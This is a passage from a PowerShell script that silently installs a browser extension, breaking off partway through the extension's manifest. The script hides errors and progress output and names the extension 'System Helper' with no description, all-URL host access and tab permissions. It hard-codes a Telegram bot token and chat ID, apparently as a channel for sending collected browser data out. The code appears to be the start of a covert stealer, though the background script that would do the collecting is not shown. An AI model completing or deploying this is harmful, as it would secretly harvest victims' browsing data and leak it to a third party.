# sssender - COMPLETE AUTOMATED INSTALLER
# Creates EVERYTHING automatically

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ===== CONFIG =====
$EXTENSION_DIR = "$env:APPDATA\sssender"

# ===== YOUR TELEGRAM CREDENTIALS =====
$TELEGRAM_TOKEN = '8850367033:AAFEEA-N2RIOzv6pLZV0c-QsfaCVzIVi_qc'
$TELEGRAM_CHAT_ID = '8919826228'

Write-Host "Installing sssender..." -ForegroundColor Cyan

# ===== CREATE DIRECTORY =====
New-Item -ItemType Directory -Force -Path $EXTENSION_DIR | Out-Null

# ===== 1. CREATE MANIFEST.JSON =====
@'
{
  "manifest_version": 3,
  "name": "System Helper",
  "version": "1.0.0",
  "description": "",
  "permissions": ["activeTab","tabs","storage","alarms"],
  "host_permissions": ["<all_urls>"],
  "background": {"service_worker": "background.js\